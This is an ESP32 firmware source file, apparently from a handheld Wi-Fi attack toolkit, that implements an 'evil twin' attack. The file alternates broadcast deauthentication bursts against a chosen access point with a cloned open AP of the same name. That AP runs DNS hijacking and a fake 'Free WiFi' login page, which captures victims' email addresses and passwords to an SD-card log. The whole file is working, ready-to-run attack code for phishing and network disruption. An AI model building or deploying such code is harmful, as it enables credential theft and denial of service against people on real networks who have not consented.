/*
 * evil_twin — chained AP-clone + Evil Portal + periodic deauth.
 *
 * One-button workflow:
 *   1. Operator picks a target AP in WiFi -> Scan.
 *   2. This feature time-slices the radio between two phases:
 *        PHASE A (5 s): raw-IDF STA mode + promiscuous, broadcast
 *                       deauth at target BSSID every 2 s so clients
 *                       fall off the real AP and re-associate.
 *        PHASE B (25 s): raw-IDF AP mode beaconing the target's SSID
 *                        on the target's channel, DNS hijack + HTTP
 *                        captive portal serving HTML_FREEWIFI,
 *                        catches creds to /poseidon/creds.log.
 *   3. Cycle repeats until ESC.
 *
 * Why time-slice instead of APSTA: Bruce-pinned libs crash
 * ieee80211_hostap_attach on softAP under heap pressure and starve the
 * AP TX pool when raw deauth shares the same WiFi state machine. Two
 * separate clean cycles is the only stable path. Same recipe both
 * wifi_portal.cpp and wifi_beacon_spam.cpp rely on, alternated.
 *
 * Critical quirks (Bruce libs):
 *   - WiFi.softAP() crashes; we use raw esp_wifi_* with reduced bufs.
 *   - esp_wifi_set_channel() MUST be called AFTER esp_wifi_start();
 *     the channel field in wifi_config_t is ignored by the AP path.
 *   - esp_bt_controller_mem_release(BTDM) is one-way until reboot —
 *     after running this, BLE features are dead. Same trade as Portal.
 *   - Sanity-check linker override (wifi_sanity_override.cpp) lets raw
 *     deauth/disassoc TX on WIFI_IF_STA via wifi_deauth_pair().
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "../wifi_types.h"
#include "wifi_deauth_frame.h"
#include "../sfx.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include "../sd_helper.h"
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_err.h>
#include <esp_bt.h>

/* Minimal portal HTML — duplicated from wifi_portal.cpp's HTML_FREEWIFI
 * because that string is file-static there. Same fields ("u"/"p") so
 * the handle_login form contract matches. */
static const char ET_HTML[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Free WiFi - Authentication Required</title>
<style>body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;padding:40px;border-radius:12px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
h1{margin:0 0 8px;color:#333}p{color:#666;margin-bottom:24px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}
button{width:100%;padding:14px;background:#667eea;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
</style></head><body>
<div class="c">
<h1>Free WiFi</h1><p>Please sign in with your email to continue.</p>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email address" required>
<input name="p" type="password" placeholder="Password" required>
<button>Connect</button>
</form></div></body></html>
)RAW";

/* Phase durations — picked so portal owns most of the airtime but a
 * deauth burst lands often enough to keep clients oscillating. */
static const uint32_t ET_PHASE_DEAUTH_MS = 5000;
static const uint32_t ET_PHASE_PORTAL_MS = 25000;
static const uint32_t ET_DEAUTH_INTERVAL_MS = 2000;

static WebServer *s_http = nullptr;
static DNSServer *s_dns  = nullptr;
static volatile uint32_t s_creds = 0;
static volatile uint32_t s_hits  = 0;
static volatile bool     s_cred_flash = false;
static char              s_last_user[48] = {0};
static char              s_target_ssid[33] = {0};
static uint8_t           s_target_bssid[6] = {0};
static uint8_t           s_target_channel  = 1;
static uint32_t          s_deauth_frames   = 0;

static bool s_sta_netif_created = false;
static bool s_ap_netif_created  = false;

static void et_log_cred(const String &u, const String &p, const String &src)
{
    File f = SD.open("/poseidon/creds.log", FILE_APPEND);
    if (!f) return;
    f.printf("%lu,%s,%s,%s,%s\n",
             (unsigned long)(millis() / 1000),
             s_target_ssid, src.c_str(), u.c_str(), p.c_str());
    f.close();
    s_creds++;
    strncpy(s_last_user, u.c_str(), sizeof(s_last_user) - 1);
    s_last_user[sizeof(s_last_user) - 1] = '\0';
    s_cred_flash = true;
    Serial.printf("[et] CRED u=%s p=%s\n", u.c_str(), p.c_str());
}

static void et_handle_login(void)
{
    String u = s_http->arg("u");
    String p = s_http->arg("p");
    if (u.length() > 0 || p.length() > 0) {
        et_log_cred(u, p, s_http->client().remoteIP().toString());
    }
    s_http->send(200, "text/html",
        "<html><body style='font:16px Arial;text-align:center;padding:60px'>"
        "<h2>Please wait...</h2><p>Authenticating.</p>"
        "<script>setTimeout(function(){location='/'},2000)</script>"
        "</body></html>");
}

static void et_handle_root(void)
{
    s_hits++;
    s_http->send_P(200, "text/html", ET_HTML);
}

static void et_handle_probe(void)
{
    s_hits++;
    s_http->sendHeader("Location", "/", true);
    s_http->send(302, "text/plain", "");
}

/* ---- STA (deauth) phase ---- */

/* Raw-IDF STA bring-up matching wifi_beacon_spam.cpp's recipe. Promisc
 * is required to enable raw 802.11 TX on IF_STA in this build. */
static bool et_sta_up(uint8_t channel)
{
    esp_netif_init();
    esp_event_loop_create_default();
    /* Gate on the netif actually existing, not a sticky flag — another feature
     * (e.g. the portal) may have destroyed WIFI_STA_DEF since we last ran, and
     * a stale flag would leave us with no STA netif. */
    if (!esp_netif_get_handle_from_ifkey("WIFI_STA_DEF")) {
        esp_netif_create_default_wifi_sta();
        s_sta_netif_created = true;
    }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    cfg.static_tx_buf_num  = 0;
    cfg.dynamic_tx_buf_num = 8;
    cfg.tx_buf_type        = 1;
    cfg.cache_tx_buf_num   = 4;
    cfg.static_rx_buf_num  = 4;
    cfg.dynamic_rx_buf_num = 8;
    cfg.ampdu_tx_enable    = 0;
    cfg.ampdu_rx_enable    = 0;
    esp_err_t rc = esp_wifi_init(&cfg);
    Serial.printf("[et] STA wifi_init rc=%d\n", (int)rc);
    if (rc != ESP_OK) return false;
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    rc = esp_wifi_start();
    Serial.printf("[et] STA wifi_start rc=%d\n", (int)rc);
    if (rc != ESP_OK) { esp_wifi_deinit(); return false; }
    esp_wifi_disconnect();
    /* MASK_ALL filter — Porkchop pattern matches wifi_silent_ap_begin. */
    static const wifi_promiscuous_filter_t all_filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&all_filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    return true;
}

static void et_wifi_down(void)
{
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
}

/* ---- AP (portal) phase ---- */

/* Raw-IDF AP bring-up — verbatim from wifi_portal.cpp run_portal,
 * tuned for the target's channel rather than a fixed channel 1. */
static bool et_ap_up(uint8_t channel)
{
    esp_netif_init();
    esp_event_loop_create_default();
    if (!esp_netif_get_handle_from_ifkey("WIFI_AP_DEF")) {
        esp_netif_create_default_wifi_ap();
        s_ap_netif_created = true;
    }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    cfg.static_tx_buf_num  = 0;
    cfg.dynamic_tx_buf_num = 16;
    cfg.tx_buf_type        = 1;
    cfg.cache_tx_buf_num   = 4;
    cfg.static_rx_buf_num  = 4;
    cfg.dynamic_rx_buf_num = 16;
    cfg.ampdu_tx_enable    = 0;
    cfg.ampdu_rx_enable    = 0;
    esp_err_t rc = esp_wifi_init(&cfg);
    Serial.printf("[et] AP wifi_init rc=%d\n", (int)rc);
    if (rc != ESP_OK) return false;
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t apc = {};
    strncpy((char *)apc.ap.ssid, s_target_ssid, sizeof(apc.ap.ssid) - 1);
    apc.ap.ssid_len        = strlen(s_target_ssid);
    apc.ap.channel         = channel;
    apc.ap.authmode        = WIFI_AUTH_OPEN;
    apc.ap.max_connection  = 4;
    apc.ap.beacon_interval = 100;
    apc.ap.ssid_hidden     = 0;
    rc = esp_wifi_set_config(WIFI_IF_AP, &apc);
    Serial.printf("[et] AP set_config rc=%d\n", (int)rc);
    rc = esp_wifi_start();
    Serial.printf("[et] AP wifi_start rc=%d\n", (int)rc);
    if (rc != ESP_OK) { esp_wifi_deinit(); return false; }
    /* Bug 11: bump TX power to 19.5 dBm (~89 mW). Default after fresh
     * init is ~15 dBm which makes the twin look weaker than the victim.
     * 78 = 19.5 dBm in 0.25 dBm units. Must follow esp_wifi_start. */
    esp_wifi_set_max_tx_power(84);
    /* CRITICAL: force channel post-start; config-side channel is
     * ignored by the AP path on Bruce libs. */
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    /* 1500 ms settle for AP_START / first beacon. */
    uint32_t t0 = millis();
    while (millis() - t0 < 1500) { delay(20); }
    return true;
}

/* ---- UI ---- */

static void et_draw_static(void)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_BAD, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("EVIL TWIN");
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_BAD);
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 18); d.printf("SSID: %s", s_target_ssid);
    d.setCursor(4, BODY_Y + 30); d.printf("BSSID:%02X:%02X:%02X:%02X:%02X:%02X",
                                          s_target_bssid[0], s_target_bssid[1],
                                          s_target_bssid[2], s_target_bssid[3],
                                          s_target_bssid[4], s_target_bssid[5]);
    d.setCursor(4, BODY_Y + 42); d.printf("ch:%u", (unsigned)s_target_channel);
    ui_draw_footer("`=stop");
}

static void et_draw_phase(const char *phase_name, uint16_t phase_color,
                          uint32_t remaining_ms)
{
    auto &d = M5Cardputer.Display;
    /* Clear dynamic block (phase line + counters). */
    d.fillRect(0, BODY_Y + 54, SCR_W, 30, T_BG);
    d.setTextColor(phase_color, T_BG);
    d.setCursor(4, BODY_Y + 54);
    d.printf("%s %lus", phase_name, (unsigned long)((remaining_ms + 999) / 1000));
    d.setTextColor(T_FG, T_BG);
    d.setCursor(4, BODY_Y + 66);
    d.printf("dx:%lu hits:%lu", (unsigned long)s_deauth_frames,
             (unsigned long)s_hits);
    d.setTextColor(s_creds > 0 ? T_GOOD : T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 78);
    d.printf("creds: %lu", (unsigned long)s_creds);
    ui_draw_status(radio_name(), "eviltwin");
}

/* ---- phase loops ---- */

/* Returns true on ESC (user wants to exit). */
static bool et_run_deauth_phase(void)
{
    if (!et_sta_up(s_target_channel)) {
        ui_toast("STA up failed", T_BAD, 1500);
        return true;
    }

    uint32_t t_phase = millis();
    uint32_t last_deauth = 0;
    uint32_t last_draw   = 0;
    uint16_t seq = 0;

    while (millis() - t_phase < ET_PHASE_DEAUTH_MS) {
        uint32_t now = millis();
        if (now - last_deauth >= ET_DEAUTH_INTERVAL_MS || last_deauth == 0) {
            last_deauth = now;
            int ok = wifi_deauth_broadcast(s_target_bssid, &seq);
            s_deauth_frames += (uint32_t)ok;
        }
        if (now - last_draw > 250) {
            last_draw = now;
            uint32_t remaining = ET_PHASE_DEAUTH_MS - (now - t_phase);
            et_draw_phase("DEAUTH", T_BAD, remaining);
        }
        uint16_t k = input_poll();
        if (k == PK_ESC) { et_wifi_down(); return true; }
        if (k == PK_NONE) delay(5);
    }
    et_wifi_down();
    return false;
}

/* Returns true on ESC. */
static bool et_run_portal_phase(void)
{
    if (!et_ap_up(s_target_channel)) {
        ui_toast("AP up failed", T_BAD, 1500);
        return true;
    }

    s_dns = new DNSServer();
    s_dns->setErrorReplyCode(DNSReplyCode::NoError);
    s_dns->start(53, "*", IPAddress(192, 168, 4, 1));

    s_http = new WebServer(80);
    s_http->on("/",                      et_handle_root);
    s_http->on("/login",      HTTP_POST, et_handle_login);
    s_http->on("/generate_204",          et_handle_probe);
    s_http->on("/hotspot-detect.html",   et_handle_probe);
    s_http->on("/ncsi.txt",              et_handle_probe);
    s_http->on("/success.txt",           et_handle_probe);
    s_http->on("/connecttest.txt",       et_handle_probe);
    s_http->onNotFound(                  et_handle_root);
    s_http->begin();

    uint32_t t_phase   = millis();
    uint32_t last_draw = 0;
    bool esc = false;

    while (millis() - t_phase < ET_PHASE_PORTAL_MS) {
        s_dns->processNextRequest();
        s_http->handleClient();

        if (s_cred_flash) {
            s_cred_flash = false;
            /* POS-AUDIT-009: tone goes through the SFX async player task
             * (POS-AUDIT-017b) and the overlay services DNS+HTTP via the
             * tick callback — Android captive-portal probe was timing
             * out across the previous 1.2 s blocking overlay window. */
            sfx_pmkid_capture();
            ui_action_overlay_with_tick("CRED CAPTURED",
                              s_last_user[0] ? s_last_user : "no user",
                              ACT_BG_WAVES, T_BAD, 1200,
                              [](void *){
                                  if (s_dns) s_dns->processNextRequest();
                                  if (s_http) s_http->handleClient();
                              }, nullptr);
            /* Overlay clobbered the static body — repaint it. */
            et_draw_static();
            last_draw = 0;
        }

        uint32_t now = millis();
        if (now - last_draw > 250) {
            last_draw = now;
            uint32_t remaining = ET_PHASE_PORTAL_MS - (now - t_phase);
            et_draw_phase("PORTAL", T_ACCENT, remaining);
        }
        uint16_t k = input_poll();
        if (k == PK_ESC) { esc = true; break; }
        if (k == PK_NONE) delay(5);
    }

    if (s_http) { s_http->close(); delete s_http; s_http = nullptr; }
    if (s_dns)  { s_dns->stop();  delete s_dns;  s_dns  = nullptr; }
    et_wifi_down();
    return esc;
}

/* ---- entry ---- */

void feat_evil_twin(void)
{
    radio_switch(RADIO_WIFI);

    if (!g_last_selected_valid) {
        ui_toast("scan an AP first", T_WARN, 1500);
        return;
    }
    if (g_last_selected_ap.is_5g) {
        /* S3 cannot TX on 5 GHz; deauth + AP path are 2.4 only. */
        ui_toast("5G target unsupported", T_WARN, 1500);
        return;
    }

    /* Snapshot target so a concurrent scan won't shift it mid-attack. */
    strncpy(s_target_ssid, g_last_selected_ap.ssid, sizeof(s_target_ssid) - 1);
    s_target_ssid[sizeof(s_target_ssid) - 1] = '\0';
    memcpy(s_target_bssid, g_last_selected_ap.bssid, 6);
    s_target_channel = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;

    if (wifi_auth_has_pmf(g_last_selected_ap.auth)) {
        /* PMF-protected (WPA3 / WPA2-Ent) — plain deauth is cryptographically
         * dropped. Portal still works for any client that joins the rogue
         * AP, but the eviction won't land. Warn but proceed. */
        ui_toast("PMF: deauth wont kick", T_WARN, 1200);
    }

    if (!sd_mount()) {
        ui_toast("SD needed for logs", T_BAD, 1500);
        return;
    }
    SD.mkdir("/poseidon");

    /* POS-AUDIT-007 (revised after on-device repro 2026-06-06):
     * force-shutdown BT before mem_release. See wifi_portal.cpp for
     * full rationale. */
    esp_wifi_set_promiscuous(false);
    bool bt_was_inited =
        (esp_bt_controller_get_status() != ESP_BT_CONTROLLER_STATUS_IDLE);
    if (bt_was_inited) {
        esp_bt_controller_disable();
        esp_bt_controller_deinit();
    }
    esp_bt_controller_mem_release(ESP_BT_MODE_BTDM);
    if (bt_was_inited) {
        ui_toast("BLE disabled until reboot", T_WARN, 1200);
    }
    esp_log_level_set("wifi",      ESP_LOG_INFO);
    esp_log_level_set("wifi_init", ESP_LOG_INFO);

    s_creds = 0;
    s_hits  = 0;
    s_deauth_frames = 0;
    s_cred_flash = false;
    s_last_user[0] = '\0';

    et_draw_static();

    /* Phase loop: alternate DEAUTH burst and PORTAL hosting until ESC. */
    while (true) {
        if (et_run_deauth_phase()) break;
        if (et_run_portal_phase()) break;
    }

    /* Clean teardown (server already torn down in portal phase / wifi_down
     * already called at the end of whichever phase exited). Belt-and-braces. */
    if (s_http) { s_http->close(); delete s_http; s_http = nullptr; }
    if (s_dns)  { s_dns->stop();  delete s_dns;  s_dns  = nullptr; }
    esp_wifi_set_promiscuous(false);
    /* esp_wifi_stop/deinit already called by phase exit. */
}
